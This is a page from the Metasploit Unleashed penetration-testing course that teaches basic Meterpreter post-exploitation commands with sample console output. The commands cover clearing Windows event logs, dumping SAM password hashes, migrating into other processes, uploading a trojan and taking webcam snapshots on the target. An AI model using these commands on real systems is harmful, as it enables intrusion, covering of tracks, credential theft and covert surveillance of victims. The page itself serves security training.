
		<!DOCTYPE html>
		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
		<head>
			<title>Meterpreter Basics - Metasploit Unleashed</title>
			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
			<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
		</head>

		<body>
			<div id="wrapper">
			
				<div id="header">
					<div id="header-content">
						<h1><a style="color:#F0F0F0" href="index.html">Metasploit Unleashed</a></h1>
						<div class="tagline">Mastering the Framework</div>
						<div class="clear"></div>
					</div>
				</div>
				
				<div id="page">
					<div id="right-box">
						
						<div id="controls">
									<ul>
			<li id="ca-nstab-main" class="selected"><a href="Meterpreter_Basics" title="View the content page [c]" accesskey="c">Page</a></li>
			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Meterpreter_Basics&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Meterpreter_Basics&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Meterpreter_Basics&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
		</ul>
							
							<div class="portlet" id="p-personal">
								<div class="pBody">
								<ul>
																	</ul>
								</div>
							</div>
							
							<div class="search">
									<div id="p-search" class="portlet">
		<div id="searchBody" class="pBody">
			<form action="http://www.offensive-security.com/w/index.php" id="searchform">
				<input type='hidden' name="title" value="Special:Search"/>
				<input type="search" name="search" title="Search Metasploit Unleashed [f]" accesskey="f" id="searchInput" />
				<input type="submit" name="go" value="Go" title="Go to a page with this exact name if exists" id="searchGoButton" class="searchButton" />&#160;
				<input type="submit" name="fulltext" value="Search" title="Search the pages for this text" id="mw-searchButton" class="searchButton" />
			</form>
		</div>
	</div>
							</div>
							
							<div class="clear"></div>
						</div>
					
						<a id="top"></a>
						
						<div id="content">
							<h1>Meterpreter Basics</h1>
						
							<div id="siteSub">From Metasploit Unleashed</div>
							<div id="contentSub"></div>
																													<div id="jump-to-nav">Jump to: <a href="Meterpreter_Basics#column-one">navigation</a>, <a href="Meterpreter_Basics#searchInput">search</a></div>
														<!-- start content -->
							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Since the Meterpreter provides a whole new environment, we will cover some of the basic Meterpreter commands to get you started and help you get familiar with this most powerful tool. Throughout this course, almost every available Meterpreter command is covered. For those that aren't covered, experimentation is the key to successful learning.
<br />
<br />
</p>
<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
<ul>
<li class="toclevel-1 tocsection-1"><a href="Meterpreter_Basics#help"><span class="tocnumber">1</span> <span class="toctext">help</span></a></li>
<li class="toclevel-1 tocsection-2"><a href="Meterpreter_Basics#background"><span class="tocnumber">2</span> <span class="toctext">background</span></a></li>
<li class="toclevel-1 tocsection-3"><a href="Meterpreter_Basics#cat"><span class="tocnumber">3</span> <span class="toctext">cat</span></a></li>
<li class="toclevel-1 tocsection-4"><a href="Meterpreter_Basics#cd_.26_pwd"><span class="tocnumber">4</span> <span class="toctext">cd &amp; pwd</span></a></li>
<li class="toclevel-1 tocsection-5"><a href="Meterpreter_Basics#clearev"><span class="tocnumber">5</span> <span class="toctext">clearev</span></a></li>
<li class="toclevel-1 tocsection-6"><a href="Meterpreter_Basics#download"><span class="tocnumber">6</span> <span class="toctext">download</span></a></li>
<li class="toclevel-1 tocsection-7"><a href="Meterpreter_Basics#edit"><span class="tocnumber">7</span> <span class="toctext">edit</span></a></li>
<li class="toclevel-1 tocsection-8"><a href="Meterpreter_Basics#execute"><span class="tocnumber">8</span> <span class="toctext">execute</span></a></li>
<li class="toclevel-1 tocsection-9"><a href="Meterpreter_Basics#getuid"><span class="tocnumber">9</span> <span class="toctext">getuid</span></a></li>
<li class="toclevel-1 tocsection-10"><a href="Meterpreter_Basics#hashdump"><span class="tocnumber">10</span> <span class="toctext">hashdump</span></a></li>
<li class="toclevel-1 tocsection-11"><a href="Meterpreter_Basics#idletime"><span class="tocnumber">11</span> <span class="toctext">idletime</span></a></li>
<li class="toclevel-1 tocsection-12"><a href="Meterpreter_Basics#ipconfig"><span class="tocnumber">12</span> <span class="toctext">ipconfig</span></a></li>
<li class="toclevel-1 tocsection-13"><a href="Meterpreter_Basics#lpwd_.26_lcd"><span class="tocnumber">13</span> <span class="toctext">lpwd &amp; lcd</span></a></li>
<li class="toclevel-1 tocsection-14"><a href="Meterpreter_Basics#ls"><span class="tocnumber">14</span> <span class="toctext">ls</span></a></li>
<li class="toclevel-1 tocsection-15"><a href="Meterpreter_Basics#migrate"><span class="tocnumber">15</span> <span class="toctext">migrate</span></a></li>
<li class="toclevel-1 tocsection-16"><a href="Meterpreter_Basics#ps"><span class="tocnumber">16</span> <span class="toctext">ps</span></a></li>
<li class="toclevel-1 tocsection-17"><a href="Meterpreter_Basics#resource"><span class="tocnumber">17</span> <span class="toctext">resource</span></a></li>
<li class="toclevel-1 tocsection-18"><a href="Meterpreter_Basics#search"><span class="tocnumber">18</span> <span class="toctext">search</span></a></li>
<li class="toclevel-1 tocsection-19"><a href="Meterpreter_Basics#shell"><span class="tocnumber">19</span> <span class="toctext">shell</span></a></li>
<li class="toclevel-1 tocsection-20"><a href="Meterpreter_Basics#upload"><span class="tocnumber">20</span> <span class="toctext">upload</span></a></li>
<li class="toclevel-1 tocsection-21"><a href="Meterpreter_Basics#webcam_list"><span class="tocnumber">21</span> <span class="toctext">webcam_list</span></a></li>
<li class="toclevel-1 tocsection-22"><a href="Meterpreter_Basics#webcam_snap"><span class="tocnumber">22</span> <span class="toctext">webcam_snap</span></a></li>
</ul>
</td></tr></table>
<p><br />
</p>
<h2> <span class="mw-headline" id="help">help</span></h2>
<p><br />
The 'help' command, as may be expected, displays the Meterpreter help menu.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#339966;'>help</span>

Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    background    Backgrounds the current session
    channel       Displays information about active channels
<span style='color:#00ff00;'>...snip...</span></pre>
<br />
</p>
<h2> <span class="mw-headline" id="background">background</span></h2>
<p><br />
The 'background' command will send the current Meterpreter session to the background and return you to the msf prompt. To get back to your Meterpreter session, just interact with it again.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#339966;'>background</span>
msf exploit(<span style='color:#ff0000;'>ms08_067_netapi</span>) > <span style='color:#339966;'>sessions -i 1</span>
<span style='color:#333399;'>[*]</span> Starting interaction with 1...

<u>meterpreter</u> ></pre>
<br />
</p>
<h2> <span class="mw-headline" id="cat">cat</span></h2>
<p><br />
The 'cat' command is identical to the command found on *nix systems. It displays the content of a file when it’s given as an argument.
<pre>
<u>meterpreter</u> > <span style='color:#339966;'>cat</span>
Usage: cat file

Example usage:
<u>meterpreter</u> > <span style='color:#339966;'>cat edit.txt</span>
What you talkin' about Willis

<u>meterpreter</u> >
</pre>
<br />
</p>
<h2> <span class="mw-headline" id="cd_.26_pwd">cd &amp; pwd</span></h2>
<p><br />
The 'cd' &amp; 'pwd' commands are used to change and display current working directly on the target host.<br />
The change directory “cd” works the same way as it does under DOS and *nix systems.<br />
By default, the current working folder is where the connection to your listener was initiated.
<br />
ARGUMENTS:<br />
<pre>
<span style='color:#ff0000;'>cd</span>:	Path of the folder to change to
<span style='color:#ff0000;'>pwd</span>:	None required
</pre>
<br />
Example usuage:
<br />
<pre>
<u>meterpreter</u> > <span style='color:#339966;'>pwd</span>
c:\
<u>meterpreter</u> > <span style='color:#339966;'>cd c:\windows</span>
<u>meterpreter</u> > <span style='color:#339966;'>pwd</span>
c:\windows
<u>meterpreter</u> >
</pre>
<br />
</p>
<h2> <span class="mw-headline" id="clearev">clearev</span></h2>
<p><br />
The 'clearev' command will clear the Application, System and Security logs on a Window systems. There are no options or arguments.
<br /><br />
Example usage:<br />
Before<br />
<a href="File:Clearev_before.png" class="image" title="Center"><img alt="Center" src="http://www.offensive-security.com/w/images/b/b9/Clearev_before.png" width="549" height="275" /></a>
<br /><br />
<pre>
<u>meterpreter</u> > <span style='color:#339966;'>clearev</span>
<span style='color:#333399;'>[*]</span> Wiping 97 records from Application...
<span style='color:#333399;'>[*]</span> Wiping 415 records from System...
<span style='color:#333399;'>[*]</span> Wiping 0 records from Security...
<u>meterpreter</u> >
</pre>
<br />
After<br />
<a href="File:Clearev_after.png" class="image" title="Center"><img alt="Center" src="http://www.offensive-security.com/w/images/c/c7/Clearev_after.png" width="542" height="274" /></a>
<br /><br />
</p>
<h2> <span class="mw-headline" id="download">download</span></h2>
<p><br />
The 'download' command downloads a file from the remote machine.  Note the use of the double-slashes when giving the Windows path.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#339966;'>download c:\\boot.ini</span>
<span style='color:#333399;'>[*]</span> downloading: c:\boot.ini -> c:\boot.ini
<span style='color:#333399;'>[*]</span> downloaded : c:\boot.ini -> c:\boot.ini/boot.ini
<u>meterpreter</u> ></pre>
<br />
</p>
<h2> <span class="mw-headline" id="edit">edit</span></h2>
<p><br />
The 'edit' command opens a file located on the target host.<br />
It uses the 'vim' so all the editor's commands are available.<br />
</p><p>Example usage:<br />
<pre>
<u>meterpreter</u> > <span style='color:#339966;'>ls</span>

Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
.
<span style='color:#00ff00;'>...snip...</span>
.
100666/rw-rw-rw-  0       fil   2012-03-01 13:47:10 -0500  edit.txt

<u>meterpreter</u> > <span style='color:#339966;'>edit edit.txt</span>
</pre>
<br />
</p><p>Please refer to the “vim” editor documentation for more advance use.<br />
<a rel="nofollow" class="external free" href="http://www.vim.org/">http://www.vim.org/</a>
<br />
</p>
<h2> <span class="mw-headline" id="execute">execute</span></h2>
<p><br />
The 'execute' command runs a command on the target.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#339966;'>execute -f cmd.exe -i -H</span>
Process 38320 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32></pre>
<br />
</p>
<h2> <span class="mw-headline" id="getuid">getuid</span></h2>
<p><br />
Running 'getuid' will display the user that the Meterpreter server is running as on the host.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#339966;'>getuid</span>
Server username: NT AUTHORITY\SYSTEM
<u>meterpreter</u> ></pre>
<br />
</p>
<h2> <span class="mw-headline" id="hashdump">hashdump</span></h2>
<p><br />
The 'hashdump' post module will dump the contents of the SAM database.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#339966;'>run post/windows/gather/hashdump</span> 

<span style='color:#333399;'>[*]</span> Obtaining the boot key...
<span style='color:#333399;'>[*]</span> Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...
<span style='color:#333399;'>[*]</span> Obtaining the user list and keys...
<span style='color:#333399;'>[*]</span> Decrypting user keys...
<span style='color:#333399;'>[*]</span> Dumping password hashes...

Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::
dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::
victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::
<u>meterpreter</u> ></pre> 
<br />
</p>
<h2> <span class="mw-headline" id="idletime">idletime</span></h2>
<p><br />
Running 'idletime' will display the number of seconds that the user at the remote machine has been idle.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#339966;'>idletime</span>
User has been idle for: 5 hours 26 mins 35 secs
<u>meterpreter</u> ></pre>
<br />
</p>
<h2> <span class="mw-headline" id="ipconfig">ipconfig</span></h2>
<p><br />
The 'ipconfig' command displays the network interfaces and addresses on the remote machine.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#339966;'>ipconfig</span>

MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address  : 127.0.0.1
Netmask     : 255.0.0.0

AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
Hardware MAC: 00:0c:29:10:f5:15
IP Address  : 192.168.1.104
Netmask     : 255.255.0.0

<u>meterpreter</u> ></pre>
<br />
</p>
<h2> <span class="mw-headline" id="lpwd_.26_lcd">lpwd &amp; lcd</span></h2>
<p><br />
The 'lpwd' &amp; 'lcd' commands are used to display and change the local working directory respectively.<br />
When receiving a meterpreter shell, the local working directory is the location where one started the Metasploit console.<br />
Changing the working directory will give your meterpreter session access to files located in this folder.
<br /><br />
ARGUMENTS:
<pre>
<span style='color:#ff0000;'>lpwd</span>:		None required
<span style='color:#ff0000;'>lcd</span>:		Destination folder
</pre>
<br />
Example usage:
<pre>
<u>meterpreter</u> > <span style='color:#339966;'>lpwd</span>
/root

<u>meterpreter</u> > <span style='color:#339966;'>lcd MSFU</span>
<u>meterpreter</u> > <span style='color:#339966;'>lpwd</span>
/root/MSFU

<u>meterpreter</u> > <span style='color:#339966;'>lcd /var/www</span>
<u>meterpreter</u> > <span style='color:#339966;'>lpwd</span>
/var/www
<u>meterpreter</u> >
</pre>
<br />
</p>
<h2> <span class="mw-headline" id="ls">ls</span></h2>
<p><br />
As in Linux, the 'ls' command will list the files in the current remote directory.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#339966;'>ls</span>

Listing: C:\Documents and Settings\victim
=========================================

Mode              Size     Type  Last modified                   Name
----              ----     ----  -------------                   ----
40777/rwxrwxrwx   0        dir   Sat Oct 17 07:40:45 -0600 2009  .
40777/rwxrwxrwx   0        dir   Fri Jun 19 13:30:00 -0600 2009  ..
100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.xbel
40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Data
<span style='color:#00ff00;'>...snip...</span></pre>
<br />
</p><p><br />
</p>
<h2> <span class="mw-headline" id="migrate">migrate</span></h2>
<p><br />
Using the 'migrate' post module, you can migrate to another process on the victim.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#339966;'>run post/windows/manage/migrate</span> 

<span style='color:#333399;'>[*]</span> Running module against V-MAC-XP
<span style='color:#333399;'>[*]</span> Current server process: svchost.exe (1076)
<span style='color:#333399;'>[*]</span> Migrating to explorer.exe...
<span style='color:#333399;'>[*]</span> Migrating into process ID 816
<span style='color:#333399;'>[*]</span> New server process: Explorer.EXE (816)
<u>meterpreter</u> ></pre>
<br />
</p>
<h2> <span class="mw-headline" id="ps">ps</span></h2>
<p><br />
The 'ps' command displays a list of running processes on the target.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#339966;'>ps</span>

Process list
============

    PID   Name                  Path
    ---   ----                  ----
    132   VMwareUser.exe        C:\Program Files\VMware\VMware Tools\VMwareUser.exe
    152   VMwareTray.exe        C:\Program Files\VMware\VMware Tools\VMwareTray.exe
    288   snmp.exe              C:\WINDOWS\System32\snmp.exe
<span style='color:#00ff00;'>...snip...</span></pre>
<br />
</p>
<h2> <span class="mw-headline" id="resource">resource</span></h2>
<p><br />
The 'resource' command will execute meterpreter instructions located inside a text file. Containing one entry per line, “resource” will execute each line in sequence. This can help automate repetitive actions performed by a user.<br /> 
By default, the commands will run in the current working directory (on target machine) and resource file in the local working directory (the attacking machine).
<br />
<br />

<pre>
<u>meterpreter</u> > <span style='color:#339966;'>resource</span> 
Usage: resource path1 path2Run the commands stored in the supplied files.
meterpreter >
</pre>

</p><p><b>ARGUMENTS:</b><br />
<pre>
<span style='color:#ff0000;'>path1</span>:		The location of the file containing the commands to run.
<span style='color:#ff0000;'>Path2Run</span>:	The location where to run the commands found inside the file
</pre>
<br />
Example usage<br />
Our file used by resource:<br />

<pre>
<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#339966;'>cat resourse.txt</span>
ls
background
<span style='color:#ff0000;'>root@kali</span>:~#
</pre>

<br />
Running resource command:<br />

<pre>
<u>meterpreter></u> > <span style='color:#339966;'>resource resourse.txt</span>
<span style='color:#333399;'>[*]</span> Reading /root/resourse.txt
<span style='color:#333399;'>[*]</span> Running ls

Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2012-02-29 16:41:29 -0500  .
40777/rwxrwxrwx   0       dir   2012-02-02 12:24:40 -0500  ..
100666/rw-rw-rw-  606     fil   2012-02-15 17:37:48 -0500  IDA Pro Free.lnk
100777/rwxrwxrwx  681984  fil   2012-02-02 15:09:18 -0500  Sc303.exe
100666/rw-rw-rw-  608     fil   2012-02-28 19:18:34 -0500  Shortcut to Ability Server.lnk
100666/rw-rw-rw-  522     fil   2012-02-02 12:33:38 -0500  XAMPP Control Panel.lnk

[*] Running background

[*] Backgrounding session 1...
msf  exploit(<span style='color:#ff0000;'>handler</span>) >

</pre>

<br />
</p>
<h2> <span class="mw-headline" id="search">search</span></h2>
<p><br />
The 'search' commands provides a way of locating specific files on the target host. The command is capable of searching through the whole system or specific folders.<br />
Wildcards can also be used when creating the file pattern to search for.
<br />
<pre>
<u>meterpreter</u> > <span style='color:#339966;'>search</span>
[-] You must specify a valid file glob to search for, e.g. >search -f *.doc
</pre>
<br />
ARGUMENTS:<br />
<pre>
File pattern:	 	May contain wildcards
Search location:	Optional, if none is given the whole system will be searched.
</pre>
<br />
Example usage:<br />
<pre>
<u>meterpreter</u> > <span style='color:#339966;'>search -f autoexec.bat</span>
Found 1 result...
    c:\AUTOEXEC.BAT
<u>meterpreter</u> > <span style='color:#339966;'>search -f sea*.bat c:\\xamp\\</span>
Found 1 result...
    c:\\xampp\perl\bin\search.bat (57035 bytes)
<u>meterpreter</u> >
</pre>
<br />
</p>
<h2> <span class="mw-headline" id="shell">shell</span></h2>
<p><br />
The 'shell' command will present you with a standard shell on the target system.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#339966;'>shell</span>
Process 39640 created.
Channel 2 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32></pre>
<br />
</p>
<h2> <span class="mw-headline" id="upload">upload</span></h2>
<p><br />
As with the 'download' command, you need to use double-slashes with the 'upload' command.
<br />
<br />
<pre><u>meterpreter</u> > <span style='color:#339966;'>upload evil_trojan.exe c:\\windows\\system32</span>
<span style='color:#333399;'>[*]</span> uploading  : evil_trojan.exe -> c:\windows\system32
<span style='color:#333399;'>[*]</span> uploaded   : evil_trojan.exe -> c:\windows\system32\evil_trojan.exe
<u>meterpreter</u> ></pre>
<br />
</p>
<h2> <span class="mw-headline" id="webcam_list">webcam_list</span></h2>
<p><br />
The 'webcam_list' command when run from the meterpreter shell, will display currently available web cams on the target host.
<br />
Example usage:<br />
<pre>
<u>meterpreter</u> > <span style='color:#339966;'>webcam_list</span>
1: Creative WebCam NX Pro
2: Creative WebCam NX Pro (VFW)
<u>meterpreter</u> >
</pre>
<br />
</p>
<h2> <span class="mw-headline" id="webcam_snap">webcam_snap</span></h2>
<p><br />
The “webcam_snap” command grabs a picture from a connected web cam on the target system, and saves it to disc as a JPEG image. By default, the save location is the local current working directory with a randomized filename.<br />
<pre>
<u>meterpreter</u> > <span style='color:#339966;'>webcam_snap -h</span>
Usage: webcam_snap [options]
Grab a frame from the specified webcam.

OPTIONS:

    -h      Help Banner
    -i &lt;opt>  The index of the webcam to use (Default: 1)
    -p &lt;opt>  The JPEG image path (Default: 'gnFjTnzi.jpeg')
    -q &lt;opt>  The JPEG image quality (Default: '50')
    -v &lt;opt>  Automatically view the JPEG image (Default: 'true')

<u>meterpreter</u> >
</pre>
<br />
OPTIONS:<br />
<pre>
-h:	Displays the help information for the command
-i opt:	If more then 1 web cam is connected, use this option to select the device to capture the
        image from
-p opt:	Change path and filename of the image to be saved
-q opt:	The imagine quality, 50 being the default/medium setting, 100 being best quality
-v opt:	By default the value is true, which opens the image after capture.
</pre>
<br />
</p><p>Example usage:<br />
<pre>
<u>meterpreter</u> > <span style='color:#339966;'>webcam_snap -i 1 -v false</span>
<span style='color:#333399;'>[*]</span> Starting...
<span style='color:#339966;'>[+]</span> Got frame
<span style='color:#333399;'>[*]</span> Stopped
Webcam shot saved to: /root/yFMaalLB.jpeg
<u>meterpreter</u> >
</pre>
<br />
<a href="File:Webcam_snap.png" class="image" title="Center"><img alt="Center" src="http://www.offensive-security.com/w/images/a/a8/Webcam_snap.png" width="569" height="491" /></a>
<br /><br />
<br />
</p>
<hr />
<p><br />









</p>
<div class="Total1"><a href="Metasploit_Fundamentals" title="Metasploit Fundamentals">Metasploit Fundamentals</a> &gt; <a href="About_Meterpreter" title="About Meterpreter">About Meterpreter</a> &gt; Meterpreter Basics</div>
<p>











































</p>
<div class="Total2"><strong class="selflink">Meterpreter Basics</strong></div>
<p>











































































</p>
<!-- 
NewPP limit report
Preprocessor visited node count: 888/1000000
Preprocessor generated node count: 3385/1000000
Post‐expand include size: 3828/2097152 bytes
Template argument size: 0/2097152 bytes
Highest expansion depth: 3/40
Expensive parser function count: 0/100
-->

<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:97-0!*!0!!en!2!* and timestamp 20131124000822 -->
</div><div class="printfooter">
Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Meterpreter_Basics&amp;oldid=1537">http://www.offensive-security.com/w/index.php?title=Meterpreter_Basics&amp;oldid=1537</a>"</div>
							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:About_Meterpreter&amp;action=edit&amp;redlink=1" class="new" title="Category:About Meterpreter (page does not exist)">About Meterpreter</a></li></ul></div></div>							<!-- end content -->
													</div>
						
					</div>
				
					<div id="left-box">
								<ul id="nav">
				<li><a href="Donate" class="root">Donate</a></li>
				<li>
					<a href="Introduction" class="root"><span class="chapter">01</span> Introduction</a>
					<div class="menu two-column">
						<h3>Introduction</h3>
						<ul class="one">
							<li><a href="Metasploit_Architecture">Metasploit Architecture</a>
								<ul class="two small">
									<li><a href="Filesystem_And_Libraries">Filesystem And Libraries</a></li>
									<li><a href="Modules_And_Locations">Modules And Locations</a></li>
									<li><a href="Metasploit_Object_Model">Metasploit Object Model</a></li>
									<li><a href="Mixins_And_Plugins">Mixins And Plugins</a></li>
								</ul>
							</li>
						</ul>
						<div class="clear"></div>
					</div>
				</li>
				<li>
					<a href="Requirements" class="root"><span class="chapter">02</span> Requirements</a>
					<div class="menu two-column">
						<h3>Required Materials</h3>
						<ul class="one">
							<li><a href="Metasploitable">Metasploitable</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Metasploit_Fundamentals" class="root"><span class="chapter">03</span>Metasploit Fundamentals</a>
					<div class="menu four-column">
						<h3>Metasploit Fundamentals</h3>
						<ul class="one">
							<li><a href="Msfcli">Msfcli</a></li>
							<li><a href="Msfconsole">Msfconsole</a>
								<ul class="two small">
									<li><a href="Msfconsole_Commands">Msfconsole Commands</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Exploits">Exploits</a>
								<ul class="two">
									<li><a href="Using_Exploits">Using Exploits</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Payloads">Payloads</a>
								<ul class="two small">
									<li><a href="Payload_Types">Payload Types</a></li>
									<li><a href="Generating_Payloads">Generating Payloads</a></li>
								</ul>
								<div class="clear"></div>
							</li>
                                                        <li><a href="Databases">Databases</a>
                                                                <ul class="two small">
                                                                        <li><a href="Using_the_Database">Using the Database</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
                                                        </li>
							<li><a href="About_Meterpreter">About Meterpreter</a>
								<ul class="two">
									<li><a href="Meterpreter_Basics">Meterpreter Basics</a></li>
								</ul>
								<div class="clear"></div>
							</li>
						</ul>
						<div class="clear"></div>
					</div>
				</li>
				<li>
				<a href="Information_Gathering" class="root"><span class="chapter">04</span> Information Gathering</a>
					<div class="menu two-column">
						<h3>Information Gathering</h3>
						<ul class="one">
							<li><a href="Port_Scanning">Port Scanning</a></li>
							<li><a href="Hunting_For_MSSQL">Hunting For MSSQL</a></li>
							<li><a href="Service_Identification">Service Identification</a></li>
							<li><a href="Password_Sniffing">Password Sniffing</a>
								<ul class="two">
									<li><a href="Extending_Psnuffle">Extending Psnuffle</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="SNMP_Sweeping">SNMP Sweeping</a></li>
							<li><a href="Writing_Your_Own_Scanner">Writing Your Own Scanner</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Vulnerability_Scanning" class="root"><span class="chapter">05</span> Vulnerability Scanning</a>
					<div class="menu two-column">
						<h3>Vulnerability Scanning</h3>
						<ul class="one">
							<li><a href="SMB_Login_Check">SMB Login Check</a></li>
							<li><a href="VNC_Authentication">VNC Authentication</a></li>
							<li><a href="WMAP_Web_Scanner">WMAP Web Scanner</a></li>
							<li><a href="Working_With_NeXpose">Working With NeXpose</a>
		     		                                <ul class="two small">
                                                                        <li><a href="NeXpose_Via_Msfconsole">NeXpose Via Msfconsole</a></li>
                                                                </ul>
                                                                <div class="clear"></div>
							</li>
                                                        <li><a href="Working_With_Nessus">Working With Nessus</a>
								<ul class="two small">
									<li><a href="Nessus_Via_Msfconsole">Nessus Via Msfconsole</a></li>
								</ul>
								<div class="clear"></div>
							</li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Writing_A_Simple_Fuzzer" class="root"><span class="chapter">06</span> Writing A Simple Fuzzer</a>
					<div class="menu two-column">
						<h3>Writing a Simple Fuzzer</h3>
						<ul class="one">
							<li><a href="Simple_TFTP_Fuzzer">Simple TFTP Fuzzer</a></li>
							<li><a href="Simple_IMAP_Fuzzer">Simple IMAP Fuzzer</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="Exploit_Development" class="root"><span class="chapter">07</span> Exploit Development</a>
					<div class="menu two-column">
						<h3>Exploit Development</h3>
						<ul class="one">
							<li><a href="Exploit_Design_Goals">Exploit Design Goals</a></li>
							<li><a href="Exploit_Format">Exploit Format</a></li>
							<li><a href="Exploit_Mixins">Exploit Mixins</a></li>
							<li><a href="Exploit_Targets">Exploit Targets</a></li>
							<li><a href="Exploit_Payloads">Exploit Payloads</a>
								<ul class="two small">
									<li><a href="Msfvenom">Msfvenom</a></li>
									<li><a href="Msfpayload">Msfpayload</a></li>
									<li><a href="Msfencode">Msfencode</a></li>
									<li><a href="Alphanumeric_Shellcode">Alphanumeric Shellcode</a></li>
									<li><a href="Msfrop">Msfrop</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Writing_An_Exploit">Writing An Exploit</a>
								<ul class="two small">
									<li><a href="Getting_A_Shell">Getting A Shell</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Using_The_Egghunter_Mixin">Using The Egghunter Mixin</a>
								<ul class="two small">
									<li><a href="Completing_The_Exploit">Completing The Exploit</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Porting_Exploits">Porting Exploits</a></li>
						</ul>
					</div>
				</li>
                                <li>
                                        <a href="Web_App_Exploit_Dev" class="root"><span class="chapter">08</span> Web App Exploit Dev</a>
                                        <div class="menu two-column">
                                                <h3>Client-side Exploits</h3>
                                                <ul class="one">
                                                        <li><a href="Installing_dotDefender">Installing dotDefender</a></li>
                                                        <li><a href="Analyzing_the_Exploit">Analyzing the Exploit</a></li>
                                                        <li><a href="Skeleton_Creation">Skeleton Creation</a></li>
                                                        <li><a href="Making_A_Log_Entry">Making A Log Entry</a></li>
                                                        <li><a href="Hosting_the_Javascript">Hosting the Javascript</a></li>
                                                        <li><a href="Final_Exploit">Final Exploit</a></li>
                                                </ul>
                                        </div>
                                </li>
				<li>
					<a href="Client_Side_Attacks" class="root"><span class="chapter">09</span> Client Side Attacks</a>
					<div class="menu three-column">
						<h3>Client Side Attacks</h3>
						<ul class="one">
							<li><a href="Binary_Payloads">Binary Payloads</a></li>
							<ul class="two small">
								<li><a href="Binary_Linux_Trojan">Binary Linux Trojan</a></li>
							</ul>
							<div class="clear"></div>
							<li><a href="Client_Side_Exploits">Client Side Exploits</a></li>
							<li><a href="VBScript_Infection_Methods">VBScript Infection Methods</a></li>
						</ul>
					</div>
				</li>
				<li>
					<a href="MSF_Post_Exploitation" class="root"><span class="chapter">10</span> MSF Post Exploitation</a>
					<div class="menu two-column">
						<h3>MSF Post Exploitation</h3>
						<ul class="one">
							<li><a href="Privilege_Escalation">Privilege Escalation</a></li>
							<li><a href="PSExec_Pass_The_Hash">PSExec Pass the Hash</a></li>
							<li><a href="Event_Log_Management">Event Log Management</a></li>
							<li><a href="Fun_With_Incognito">Fun with Incognito</a></li>
							<li><a href="Interacting_With_The_Registry">Interacting with the Registry</a>
								<ul class="two small">
									<li><a href="Persistent_Netcat_Backdoor">Persistent Netcat Backdoor</a></li>
								</ul>
								<div class="clear"></div>
							</li>
							<li><a href="Enabling_Remote_Desktop">Enabling Remote Desktop</a></li>
